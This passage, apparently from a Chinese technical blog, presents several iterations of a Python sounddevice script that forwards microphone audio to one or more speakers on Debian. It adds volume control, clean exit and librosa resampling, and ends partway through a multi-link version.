44100, 48000, 88200, 96000, 192000] supported = [] for r in rates: try: if caps[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: sd.check_input_settings(device=device_idx, samplerate=r) else: sd.check_output_settings(device=device_idx, samplerate=r) supported.append(r) except Exception: pass return supported or [int(caps[\u0026#39;default_samplerate\u0026#39;])] except Exception as e: print(f\u0026#34;无法查询设备 {device_idx}: {e}\u0026#34;) return [] def print_all_devices(): \u0026#34;\u0026#34;\u0026#34;启动时打印所有设备及其采样率\u0026#34;\u0026#34;\u0026#34; devs = query_devices() print(\u0026#34;=== 发现的所有音频设备 ===\u0026#34;) for idx, d in enumerate(devs): io = [] if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;IN\u0026#34;) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;OUT\u0026#34;) rates = list_sample_rates(idx) print(f\u0026#34;[{idx}] {d[\u0026#39;name\u0026#39;]} ({\u0026#39;,\u0026#39;.join(io)}) 支持采样率: {rates}\u0026#34;) print() def forward_stream(in_dev, out_devs, samplerate=48000, channels=1, blocksize=1024): \u0026#34;\u0026#34;\u0026#34; 不依赖 CallbackQueue 的实时转发实现 \u0026#34;\u0026#34;\u0026#34; import threading import queue if not out_devs: print(\u0026#34;没有目标喇叭，退出\u0026#34;) return # 共享队列：输入线程把数据放进去，每个输出线程各自取出来 audio_q = queue.Queue() def input_thread(): with sd.InputStream(device=in_dev, samplerate=samplerate, channels=channels, dtype=np.int16, blocksize=blocksize) as istream: while True: data, overflowed = istream.read(blocksize) if overflowed: print(\u0026#34;x\u0026#34;, end=\u0026#34;\u0026#34;, flush=True) audio_q.put(data) def output_thread(dev): with sd.OutputStream(device=dev, samplerate=samplerate, channels=channels, dtype=np.int16, blocksize=blocksize) as ostream: while True: ostream.write(audio_q.get()) # 启动输入线程 t_in = threading.Thread(target=input_thread, daemon=True) t_in.start() # 为每个输出设备启动一条输出线程 t_out = [] for d in out_devs: t = threading.Thread(target=output_thread, args=(d,), daemon=True) t.start() t_out.append(t) print(\u0026#34;开始实时转发，按 Ctrl+C 退出\u0026#34;) try: t_in.join() except KeyboardInterrupt: print(\u0026#34;\\n结束\u0026#34;) # ---------- CLI ---------- def choose(prompt, choices): \u0026#34;\u0026#34;\u0026#34;简单的数字选择菜单\u0026#34;\u0026#34;\u0026#34; while True: try: idx = int(input(prompt)) if idx in choices: return idx except ValueError: pass print(\u0026#34;无效选择，请重试\u0026#34;) def main(): print_all_devices() devs = query_devices() in_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0] out_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0] if not in_devs: print(\u0026#34;没有找到麦克风，退出\u0026#34;) return if not out_devs: print(\u0026#34;没有找到喇叭，退出\u0026#34;) return print(\u0026#34;请选择模式：\u0026#34;) print(\u0026#34;1) 把某只麦克风广播到所有喇叭\u0026#34;) print(\u0026#34;2) 把某只麦克风仅输出到指定喇叭\u0026#34;) mode = choose(\u0026#34;模式 [1/2]: \u0026#34;, {1, 2}) print(\u0026#34;请选择麦克风：\u0026#34;) for i in in_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) mic = choose(\u0026#34;麦克风编号: \u0026#34;, set(in_devs)) if mode == 1: targets = out_devs else: print(\u0026#34;请选择目标喇叭：\u0026#34;) for i in out_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) targets = [choose(\u0026#34;喇叭编号: \u0026#34;, set(out_devs))] # 默认用 48000 Hz，也可让用户输入 sr = 48000 print(f\u0026#34;使用采样率 {sr} Hz\u0026#34;) forward_stream(mic, targets, samplerate=sr) if __name__ == \u0026#39;__main__\u0026#39;: main() 运行结果\npython3 talk.py === 发现的所有音频设备 === [0] USB2.0 Device: Audio (hw:0,0) (IN,OUT) 支持采样率: [48000] [1] USB2.0 Device: Audio (hw:1,0) (IN,OUT) 支持采样率: [48000] [2] UACDemoV1.0: USB Audio (hw:2,0) (IN) 支持采样率: [48000] [3] sysdefault (IN,OUT) 支持采样率: [8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 192000] [4] front (OUT) 支持采样率: [48000] [5] surround40 (OUT) 支持采样率: [48000] [6] iec958 (OUT) 支持采样率: [48000] [7] spdif (IN,OUT) 支持采样率: [48000] [8] dmix (OUT) 支持采样率: [48000] 请选择模式： 1) 把某只麦克风广播到所有喇叭 2) 把某只麦克风仅输出到指定喇叭 模式 [1/2]: 2 请选择麦克风： 0: USB2.0 Device: Audio (hw:0,0) 1: USB2.0 Device: Audio (hw:1,0) 2: UACDemoV1.0: USB Audio (hw:2,0) 3: sysdefault 7: spdif 麦克风编号: 2 请选择目标喇叭： 0: USB2.0 Device: Audio (hw:0,0) 1: USB2.0 Device: Audio (hw:1,0) 3: sysdefault 4: front 5: surround40 6: iec958 7: spdif 8: dmix 喇叭编号: 0 使用采样率 48000 Hz 开始实时转发，按 Ctrl+C 退出 修改音量 调小 forward_stream\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; talk.py – Debian 下麦克风→喇叭实时转发示例 \u0026#34;\u0026#34;\u0026#34; import sounddevice as sd import numpy as np import argparse import threading import queue import sys # ---------- 工具 ---------- def query_devices(): return sd.query_devices() def list_sample_rates(device_idx): try: caps = sd.query_devices(device_idx) rates = [8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 192000] supported = [] for r in rates: try: if caps[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: sd.check_input_settings(device=device_idx, samplerate=r) else: sd.check_output_settings(device=device_idx, samplerate=r) supported.append(r) except Exception: pass return supported or [int(caps[\u0026#39;default_samplerate\u0026#39;])] except Exception as e: print(f\u0026#34;无法查询设备 {device_idx}: {e}\u0026#34;) return [] def print_all_devices(): devs = query_devices() print(\u0026#34;=== 发现的所有音频设备 ===\u0026#34;) for idx, d in enumerate(devs): io = [] if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;IN\u0026#34;) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;OUT\u0026#34;) rates = list_sample_rates(idx) print(f\u0026#34;[{idx}] {d[\u0026#39;name\u0026#39;]} ({\u0026#39;,\u0026#39;.join(io)}) 支持采样率: {rates}\u0026#34;) print() # ---------- 实时转发 ---------- def forward_stream(in_dev, out_devs, samplerate=48000, channels=1, blocksize=1024, in_gain=0.30, out_gain=0.30): \u0026#34;\u0026#34;\u0026#34; 实时转发 + 音量衰减，Ctrl+C 时干净退出 \u0026#34;\u0026#34;\u0026#34; if not out_devs: print(\u0026#34;没有目标喇叭，退出\u0026#34;) return audio_q = queue.Queue(maxsize=20) # 限长队列，防止爆音 stop_evt = threading.Event() # 通知所有线程结束 streams = [] # 保存所有流，便于优雅关闭 # ---------- 输入线程 ---------- def input_thread(): try: with sd.InputStream(device=in_dev, samplerate=samplerate, channels=channels, dtype=np.int16, blocksize=blocksize) as istream: streams.append(istream) while not stop_evt.is_set(): data, overflowed = istream.read(blocksize) if overflowed: print(\u0026#34;x\u0026#34;, end=\u0026#34;\u0026#34;, flush=True) data = (data * in_gain).astype(np.int16) if not stop_evt.is_set(): audio_q.put(data, timeout=0.1) except queue.Full: pass # 队列已满，直接丢掉一帧 except Exception as e: if not stop_evt.is_set(): print(\u0026#34;输入线程异常:\u0026#34;, e) # ---------- 输出线程 ---------- def output_thread(dev): try: with sd.OutputStream(device=dev, samplerate=samplerate, channels=channels, dtype=np.int16, blocksize=blocksize) as ostream: streams.append(ostream) while not stop_evt.is_set(): try: buf = audio_q.get(timeout=0.1) ostream.write(buf) except queue.Empty: pass except Exception as e: if not stop_evt.is_set(): print(\u0026#34;输出线程异常:\u0026#34;, e) # ---------- 启动 ---------- threads = [] # 输入 t = threading.Thread(target=input_thread, daemon=True) t.start() threads.append(t) # 输出 for d in out_devs: t = threading.Thread(target=output_thread, args=(d,), daemon=True) t.start() threads.append(t) print(f\u0026#34;开始实时转发，in_gain={in_gain}, out_gain={out_gain}，按 Ctrl+C 退出\u0026#34;) try: for t in threads: t.join() except KeyboardInterrupt: print(\u0026#34;\\n exit…\u0026#34;) finally: stop_evt.set() # 让阻塞在 read/write 的线程有机会跳出 while not audio_q.empty(): try: audio_q.get_nowait() except queue.Empty: break # 关闭所有 PortAudio 流 for st in streams: try: st.stop() st.close() except Exception: pass print(\u0026#34;已退出\u0026#34;) # ---------- CLI ---------- def choose(prompt, choices): while True: try: idx = int(input(prompt)) if idx in choices: return idx except ValueError: pass print(\u0026#34;无效选择，请重试\u0026#34;) def main(): parser = argparse.ArgumentParser(description=\u0026#34;麦克风→喇叭实时转发\u0026#34;) parser.add_argument(\u0026#34;--in-gain\u0026#34;, type=float, default=0.30, help=\u0026#34;输入音量系数 0~1\u0026#34;) parser.add_argument(\u0026#34;--out-gain\u0026#34;, type=float, default=0.30, help=\u0026#34;输出音量系数 0~1\u0026#34;) args = parser.parse_args() print_all_devices() devs = query_devices() in_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0] out_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0] if not in_devs: print(\u0026#34;没有找到麦克风，退出\u0026#34;) return if not out_devs: print(\u0026#34;没有找到喇叭，退出\u0026#34;) return print(\u0026#34;请选择模式：\u0026#34;) print(\u0026#34;1) 把某只麦克风广播到所有喇叭\u0026#34;) print(\u0026#34;2) 把某只麦克风仅输出到指定喇叭\u0026#34;) mode = choose(\u0026#34;模式 [1/2]: \u0026#34;, {1, 2}) print(\u0026#34;请选择麦克风：\u0026#34;) for i in in_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) mic = choose(\u0026#34;麦克风编号: \u0026#34;, set(in_devs)) if mode == 1: targets = out_devs else: print(\u0026#34;请选择目标喇叭：\u0026#34;) for i in out_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) targets = [choose(\u0026#34;喇叭编号: \u0026#34;, set(out_devs))] sr = 48000 print(f\u0026#34;使用采样率 {sr} Hz\u0026#34;) forward_stream(mic, targets, samplerate=sr, in_gain=args.in_gain, out_gain=args.out_gain) if __name__ == \u0026#39;__main__\u0026#39;: main() # 默认 30 % 音量 python3 talk.py # 自定义音量 python3 --in-gain 0.15 --out-gain 0.2 去除无效麦克风 与 杂音 广播时出现 unable to open slave / Device unavailable\n说明有无效的麦克风干扰\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; talk.py – Debian 下麦克风→喇叭实时转发 用法： python3 talk.py # 默认输入/输出音量 0.3 python3 talk.py --in-gain 0.2 --out-gain 0.15 \u0026#34;\u0026#34;\u0026#34; import sounddevice as sd import numpy as np import argparse import threading import queue import sys # ---------- 工具 ---------- def query_devices(): return sd.query_devices() def list_sample_rates(device_idx): try: caps = sd.query_devices(device_idx) rates = [8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 192000] supported = [] for r in rates: try: if caps[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: sd.check_input_settings(device=device_idx, samplerate=r) else: sd.check_output_settings(device=device_idx, samplerate=r) supported.append(r) except Exception: pass return supported or [int(caps[\u0026#39;default_samplerate\u0026#39;])] except Exception as e: print(f\u0026#34;无法查询设备 {device_idx}: {e}\u0026#34;) return [] def print_all_devices(): devs = query_devices() print(\u0026#34;=== 发现的所有音频设备 ===\u0026#34;) for idx, d in enumerate(devs): io = [] if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;IN\u0026#34;) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;OUT\u0026#34;) rates = list_sample_rates(idx) print(f\u0026#34;[{idx}] {d[\u0026#39;name\u0026#39;]} ({\u0026#39;,\u0026#39;.join(io)}) 支持采样率: {rates}\u0026#34;) print() # ---------- 实时转发 ---------- def forward_stream(in_dev, out_devs, samplerate=48000, channels=1, blocksize=1024, in_gain=0.30, out_gain=0.30): \u0026#34;\u0026#34;\u0026#34; 实时转发 + 音量衰减，Ctrl+C 时干净退出 \u0026#34;\u0026#34;\u0026#34; if not out_devs: print(\u0026#34;没有目标喇叭，退出\u0026#34;) return audio_q = queue.Queue(maxsize=20) # 限长队列 stop_evt = threading.Event() streams = [] def input_thread(): try: with sd.InputStream(device=in_dev, samplerate=samplerate, channels=channels, dtype=np.int16, blocksize=blocksize) as istream: streams.append(istream) while not stop_evt.is_set(): data, overflowed = istream.read(blocksize) if overflowed: print(\u0026#34;x\u0026#34;, end=\u0026#34;\u0026#34;, flush=True) data = (data * in_gain).astype(np.int16) try: audio_q.put(data, timeout=0.1) except queue.Full: pass except Exception as e: if not stop_evt.is_set(): print(\u0026#34;输入线程异常:\u0026#34;, e) def output_thread(dev): try: with sd.OutputStream(device=dev, samplerate=samplerate, channels=channels, dtype=np.int16, blocksize=blocksize) as ostream: streams.append(ostream) while not stop_evt.is_set(): try: buf = audio_q.get(timeout=0.1) buf = (buf * out_gain).astype(np.int16) ostream.write(buf) except queue.Empty: pass except Exception as e: if not stop_evt.is_set(): print(\u0026#34;输出线程异常:\u0026#34;, e) threads = [] t = threading.Thread(target=input_thread, daemon=True) t.start() threads.append(t) for d in out_devs: t = threading.Thread(target=output_thread, args=(d,), daemon=True) t.start() threads.append(t) print(f\u0026#34;开始实时转发，in_gain={in_gain}, out_gain={out_gain}，按 Ctrl+C 退出\u0026#34;) try: for t in threads: t.join() except KeyboardInterrupt: print(\u0026#34;\\n正在优雅退出…\u0026#34;) finally: stop_evt.set() while not audio_q.empty(): try: audio_q.get_nowait() except queue.Empty: break for st in streams: try: st.stop() st.close() except Exception: pass print(\u0026#34;已退出\u0026#34;) # ---------- CLI ---------- def choose(prompt, choices): while True: try: idx = int(input(prompt)) if idx in choices: return idx except ValueError: pass print(\u0026#34;无效选择，请重试\u0026#34;) def main(): parser = argparse.ArgumentParser(description=\u0026#34;麦克风→喇叭实时转发\u0026#34;) parser.add_argument(\u0026#34;--in-gain\u0026#34;, type=float, default=0.30, help=\u0026#34;输入音量系数 0-1，默认 0.30\u0026#34;) parser.add_argument(\u0026#34;--out-gain\u0026#34;, type=float, default=0.30, help=\u0026#34;输出音量系数 0-1，默认 0.30\u0026#34;) args = parser.parse_args() print_all_devices() devs = query_devices() # 输入：所有麦克风 in_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0] # 输出：只保留一个不会冲突的设备（pulse / default / sysdefault / 第一个） def is_safe_out(idx): name = devs[idx][\u0026#39;name\u0026#39;].lower() return any(k in name for k in (\u0026#39;pulse\u0026#39;, \u0026#39;default\u0026#39;, \u0026#39;sysdefault\u0026#39;)) out_all = [i for i, d in enumerate(devs) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0] out_devs = [i for i in out_all if is_safe_out(i)] if not out_devs: # 兜底 out_devs = out_all[:1] if not in_devs: print(\u0026#34;没有找到麦克风，退出\u0026#34;) return if not out_devs: print(\u0026#34;没有找到可用喇叭，退出\u0026#34;) return print(\u0026#34;请选择模式：\u0026#34;) print(\u0026#34;1) 把某只麦克风广播到系统混音输出\u0026#34;) print(\u0026#34;2) 把某只麦克风仅输出到指定设备\u0026#34;) mode = choose(\u0026#34;模式 [1/2]: \u0026#34;, {1, 2}) print(\u0026#34;请选择麦克风：\u0026#34;) for i in in_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) mic = choose(\u0026#34;麦克风编号: \u0026#34;, set(in_devs)) if mode == 1: targets = out_devs[:1] # 只取第一个混音设备 else: print(\u0026#34;请选择目标喇叭：\u0026#34;) for i in out_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) targets = [choose(\u0026#34;喇叭编号: \u0026#34;, set(out_devs))] sr = 48000 print(f\u0026#34;使用采样率 {sr} Hz，目标设备：{[devs[i][\u0026#39;name\u0026#39;] for i in targets]}\u0026#34;) forward_stream(mic, targets, samplerate=sr, in_gain=args.in_gain, out_gain=args.out_gain) if __name__ == \u0026#39;__main__\u0026#39;: main() 支持更多的采样率 优化输出喇叭设备显示 pyaudio\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; talk.py – Debian 下麦克风→喇叭实时转发 用法： python3 talk.py # 默认输入/输出音量 0.3 python3 talk.py --in-gain 0.2 --out-gain 0.15 \u0026#34;\u0026#34;\u0026#34; import sounddevice as sd import numpy as np import argparse import threading import queue import sys # ---------- 工具 ---------- def query_devices(): return sd.query_devices() def list_sample_rates(device_idx): try: caps = sd.query_devices(device_idx) rates = [8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 192000] supported = [] for r in rates: try: if caps[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: sd.check_input_settings(device=device_idx, samplerate=r) else: sd.check_output_settings(device=device_idx, samplerate=r) supported.append(r) except Exception: pass return supported or [int(caps[\u0026#39;default_samplerate\u0026#39;])] except Exception as e: print(f\u0026#34;无法查询设备 {device_idx}: {e}\u0026#34;) return [] def print_all_devices(): devs = query_devices() print(\u0026#34;=== 发现的所有音频设备 ===\u0026#34;) for idx, d in enumerate(devs): io = [] if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;IN\u0026#34;) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;OUT\u0026#34;) rates = list_sample_rates(idx) print(f\u0026#34;[{idx}] {d[\u0026#39;name\u0026#39;]} ({\u0026#39;,\u0026#39;.join(io)}) 支持采样率: {rates}\u0026#34;) print() # ---------- 实时转发 ---------- def forward_stream(in_dev, out_devs, samplerate=48000, channels=1, blocksize=1024, in_gain=0.30, out_gain=0.30): \u0026#34;\u0026#34;\u0026#34; 实时转发 + 音量衰减，Ctrl+C 时干净退出 \u0026#34;\u0026#34;\u0026#34; if not out_devs: print(\u0026#34;没有目标喇叭，退出\u0026#34;) return audio_q = queue.Queue(maxsize=20) # 限长队列 stop_evt = threading.Event() streams = [] def input_thread(): try: with sd.InputStream(device=in_dev, samplerate=samplerate, channels=channels, dtype=np.int16, blocksize=blocksize) as istream: streams.append(istream) while not stop_evt.is_set(): data, overflowed = istream.read(blocksize) if overflowed: print(\u0026#34;x\u0026#34;, end=\u0026#34;\u0026#34;, flush=True) data = (data * in_gain).astype(np.int16) try: audio_q.put(data, timeout=0.1) except queue.Full: pass except Exception as e: if not stop_evt.is_set(): print(\u0026#34;输入线程异常:\u0026#34;, e) def output_thread(dev): try: with sd.OutputStream(device=dev, samplerate=samplerate, channels=channels, dtype=np.int16, blocksize=blocksize) as ostream: streams.append(ostream) while not stop_evt.is_set(): try: buf = audio_q.get(timeout=0.1) buf = (buf * out_gain).astype(np.int16) ostream.write(buf) except queue.Empty: pass except Exception as e: if not stop_evt.is_set(): print(\u0026#34;输出线程异常:\u0026#34;, e) threads = [] t = threading.Thread(target=input_thread, daemon=True) t.start() threads.append(t) for d in out_devs: t = threading.Thread(target=output_thread, args=(d,), daemon=True) t.start() threads.append(t) print(f\u0026#34;开始实时转发，in_gain={in_gain}, out_gain={out_gain}，按 Ctrl+C 退出\u0026#34;) try: for t in threads: t.join() except KeyboardInterrupt: print(\u0026#34;\\n正在优雅退出…\u0026#34;) finally: stop_evt.set() while not audio_q.empty(): try: audio_q.get_nowait() except queue.Empty: break for st in streams: try: st.stop() st.close() except Exception: pass print(\u0026#34;已退出\u0026#34;) # ---------- CLI ---------- def choose(prompt, choices): while True: try: idx = int(input(prompt)) if idx in choices: return idx except ValueError: pass print(\u0026#34;无效选择，请重试\u0026#34;) def main(): parser = argparse.ArgumentParser(description=\u0026#34;麦克风→喇叭实时转发\u0026#34;) parser.add_argument(\u0026#34;--in-gain\u0026#34;, type=float, default=0.30) parser.add_argument(\u0026#34;--out-gain\u0026#34;, type=float, default=0.30) args = parser.parse_args() print_all_devices() devs = query_devices() # 1. 所有麦克风 in_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0] # 2. 所有 OUT 设备，全部保留 out_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0] if not in_devs: print(\u0026#34;没有找到麦克风，退出\u0026#34;) return if not out_devs: print(\u0026#34;没有找到可用喇叭，退出\u0026#34;) return print(\u0026#34;请选择模式：\u0026#34;) print(\u0026#34;1) 把某只麦克风广播到所有喇叭\u0026#34;) print(\u0026#34;2) 把某只麦克风仅输出到指定设备\u0026#34;) mode = choose(\u0026#34;模式 [1/2]: \u0026#34;, {1, 2}) print(\u0026#34;请选择麦克风：\u0026#34;) for i in in_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) mic = choose(\u0026#34;麦克风编号: \u0026#34;, set(in_devs)) if mode == 1: targets = out_devs # 所有 OUT 设备 else: print(\u0026#34;请选择目标喇叭：\u0026#34;) for i in out_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) targets = [choose(\u0026#34;喇叭编号: \u0026#34;, set(out_devs))] sr = 48000 print(f\u0026#34;使用采样率 {sr} Hz，目标设备：{[devs[i][\u0026#39;name\u0026#39;] for i in targets]}\u0026#34;) forward_stream(mic, targets, samplerate=sr, in_gain=args.in_gain, out_gain=args.out_gain) if __name__ == \u0026#39;__main__\u0026#39;: main() Librosa音频处理 #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; talk.py – Debian 麦克风→喇叭实时转发 支持任意麦克风/喇叭采样率自动重采样 python3 talk.py python3 talk.py --in-gain 0.2 --out-gain 0.15 \u0026#34;\u0026#34;\u0026#34; import sounddevice as sd import numpy as np import librosa import argparse import threading import queue import sys # ---------- 工具 ---------- def query_devices(): return sd.query_devices() def list_sample_rates(device_idx): try: caps = sd.query_devices(device_idx) rates = [8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 192000] supported = [] for r in rates: try: if caps[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: sd.check_input_settings(device=device_idx, samplerate=r) else: sd.check_output_settings(device=device_idx, samplerate=r) supported.append(r) except Exception: pass return supported or [int(caps[\u0026#39;default_samplerate\u0026#39;])] except Exception as e: print(f\u0026#34;无法查询设备 {device_idx}: {e}\u0026#34;) return [] def print_all_devices(): devs = query_devices() print(\u0026#34;=== 发现的所有音频设备 ===\u0026#34;) for idx, d in enumerate(devs): io = [] if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;IN\u0026#34;) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;OUT\u0026#34;) rates = list_sample_rates(idx) print(f\u0026#34;[{idx}] {d[\u0026#39;name\u0026#39;]} ({\u0026#39;,\u0026#39;.join(io)}) 采样率:{rates}\u0026#34;) print() # ---------- 实时转发 ---------- def forward_stream(in_dev, out_devs, in_sr=48000, channels=1, blocksize=1024, in_gain=0.30, out_gain=0.30): \u0026#34;\u0026#34;\u0026#34; 手动重采样：麦克风 in_sr → 目标喇叭实际采样率 \u0026#34;\u0026#34;\u0026#34; if not out_devs: print(\u0026#34;没有目标喇叭，退出\u0026#34;) return # 统一用目标喇叭的实际采样率 out_sr = int(sd.query_devices(out_devs[0])[\u0026#39;default_samplerate\u0026#39;]) print(f\u0026#34;麦克风采样率 {in_sr} → 喇叭采样率 {out_sr}\u0026#34;) audio_q = queue.Queue(maxsize=20) stop_evt = threading.Event() streams = [] # ---------- 输入线程 ---------- def input_thread(): try: with sd.InputStream(device=in_dev, samplerate=in_sr, channels=channels, dtype=np.int16, blocksize=blocksize) as istream: streams.append(istream) while not stop_evt.is_set(): data, overflowed = istream.read(blocksize) if overflowed: print(\u0026#34;x\u0026#34;, end=\u0026#34;\u0026#34;, flush=True) # 降采样 / 升采样到目标喇叭采样率 data_f = data.astype(np.float32).T # (channels, frames) data_resamp = librosa.resample(data_f, orig_sr=in_sr, target_sr=out_sr).T data_int = (data_resamp * in_gain).astype(np.int16) if not stop_evt.is_set(): try: audio_q.put(data_int, timeout=0.1) except queue.Full: pass except Exception as e: if not stop_evt.is_set(): print(\u0026#34;输入线程异常:\u0026#34;, e) # ---------- 输出线程 ---------- def output_thread(dev): try: with sd.OutputStream(device=dev, samplerate=out_sr, channels=channels, dtype=np.int16, blocksize=None) as ostream: streams.append(ostream) while not stop_evt.is_set(): try: buf = audio_q.get(timeout=0.1) buf = (buf * out_gain).astype(np.int16) ostream.write(buf) except queue.Empty: pass except Exception as e: if not stop_evt.is_set(): print(\u0026#34;输出线程异常:\u0026#34;, e) # ---------- 启动 ---------- threads = [] t = threading.Thread(target=input_thread, daemon=True) t.start() threads.append(t) for d in out_devs: t = threading.Thread(target=output_thread, args=(d,), daemon=True) t.start() threads.append(t) print(f\u0026#34;开始实时转发，in_gain={in_gain}, out_gain={out_gain}，按 Ctrl+C 退出\u0026#34;) try: for t in threads: t.join() except KeyboardInterrupt: print(\u0026#34;\\n正在优雅退出…\u0026#34;) finally: stop_evt.set() while not audio_q.empty(): try: audio_q.get_nowait() except queue.Empty: break for st in streams: try: st.stop() st.close() except Exception: pass print(\u0026#34;已退出\u0026#34;) # ---------- CLI ---------- def choose(prompt, choices): while True: try: idx = int(input(prompt)) if idx in choices: return idx except ValueError: pass print(\u0026#34;无效选择，请重试\u0026#34;) def main(): parser = argparse.ArgumentParser(description=\u0026#34;麦克风→喇叭实时转发\u0026#34;) parser.add_argument(\u0026#34;--in-gain\u0026#34;, type=float, default=0.30) parser.add_argument(\u0026#34;--out-gain\u0026#34;, type=float, default=0.30) args = parser.parse_args() print_all_devices() devs = query_devices() # 输入 in_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0] # 输出（全部真实 OUT 设备，不额外过滤） out_devs = [i for i, d in enumerate(devs) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0] if not in_devs: print(\u0026#34;没有找到麦克风，退出\u0026#34;) return if not out_devs: print(\u0026#34;没有找到可用喇叭，退出\u0026#34;) return print(\u0026#34;请选择模式：\u0026#34;) print(\u0026#34;1) 把某只麦克风广播到所有喇叭\u0026#34;) print(\u0026#34;2) 把某只麦克风仅输出到指定设备\u0026#34;) mode = choose(\u0026#34;模式 [1/2]: \u0026#34;, {1, 2}) print(\u0026#34;请选择麦克风：\u0026#34;) for i in in_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) mic = choose(\u0026#34;麦克风编号: \u0026#34;, set(in_devs)) # 麦克风默认采样率（如有需要可再让用户选） in_sr = int(sd.query_devices(mic)[\u0026#39;default_samplerate\u0026#39;]) if mode == 1: targets = out_devs else: print(\u0026#34;请选择目标喇叭：\u0026#34;) for i in out_devs: print(f\u0026#34; {i}: {devs[i][\u0026#39;name\u0026#39;]}\u0026#34;) targets = [choose(\u0026#34;喇叭编号: \u0026#34;, set(out_devs))] forward_stream(mic, targets, in_sr=in_sr, in_gain=args.in_gain, out_gain=args.out_gain) if __name__ == \u0026#39;__main__\u0026#39;: main() 使用示例\npython3 talk.py # 或者 python3 talk.py --in-gain 0.2 --out-gain 0.15 多输入输出模式 . #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; talk_mimo.py – 多输入多输出对话（A→B / B→A 同时） python3 talk_mimo.py python3 talk_mimo.py --link 0,3 --link 3,0 # 0号麦→3号喇叭, 3号麦→0号喇叭 \u0026#34;\u0026#34;\u0026#34; import sounddevice as sd import numpy as np import librosa import argparse import threading import queue import sys import itertools # ---------- 设备工具 ---------- def query_devices(): return sd.query_devices() def print_all_devices(): devs = query_devices() print(\u0026#34;=== 发现的所有音频设备 ===\u0026#34;) for idx, d in enumerate(devs): io = [] if d[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;IN\u0026#34;) if d[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0: io.append(\u0026#34;OUT\u0026#34;) print(f\u0026#34;[{idx}] {d[\u0026#39;name\u0026#39;]} ({\u0026#39;,\u0026#39;.join(io)})\u0026#34;) print() # ---------- 单链路 ---------- class Link(threading.Thread): def __init__(self, in_dev: int, out_dev: int, channels: int = 1, blocksize: int = 1024, in_gain: float = 0.30, out_gain: float = 0.30): super().__init__(daemon=True) self.in_dev = in_dev self.out_dev = out_dev self.channels = channels self.blocksize = blocksize self.in_gain = in_gain self.out_gain = out_gain self._stop = threading.Event() def run(self): # 采样率 in_sr = int(sd.query_devices(self.in_dev)[\u0026#39;default_samplerate\u0026#39;]) out_sr = int(sd.query_devices(self.out_dev)[\u0026#39;default_samplerate\u0026#39;]) q = queue.Queue(maxsize=20) # 输入线程 def in_worker(): try: with sd.InputStream(device=self.in_dev, samplerate=in_sr, channels=self.channels, dtype=np.int16, blocksize=self.blocksize) as istream: while not self._stop.is_set(): data, _ = istream.read(self.blocksize) data_f = data.astype(np.float32).T resamp = librosa.resample(data_f, orig_sr=in_sr, target_sr=out_sr).T resamp = (resamp * self.in_gain).astype(np.int16) try: q.put(resamp, timeout=0.1) except queue.Full: pass except Exception as e: if not self._stop.is_set(): print(f\u0026#34;输入设备 {self.in_dev} 异常: {e}\u0026#34;) # 输出线程 def 